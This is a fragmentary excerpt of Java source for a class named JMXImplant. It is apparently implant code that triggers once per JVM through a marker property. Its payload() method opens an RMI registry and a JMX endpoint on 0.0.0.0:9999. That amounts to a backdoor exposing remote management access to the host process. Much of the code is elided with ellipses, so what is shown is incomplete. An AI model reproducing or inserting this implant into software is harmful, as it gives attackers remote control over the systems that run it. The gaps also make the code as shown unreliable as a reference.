 ...
 * it slightly.</p>
 */
public class JMXImplant implements Runnable, Thread.UncaughtExceptionHandler {
    /**
    ...
    static volatile int CONF_PORT = 9999;
    ...
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                JMXImplant implant = new JMXImplant();
    ...
    private void payload() {
        ...
        try {
            Registry registry = LocateRegistry.createRegistry(CONF_PORT);
            JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://0.0.0.0:" + CONF_PORT + "/jmxrmi");
        ...
        try {
            int byteData;
            while ((byteData = System.in.read()) != -1) {  // Reads bytes until EOF
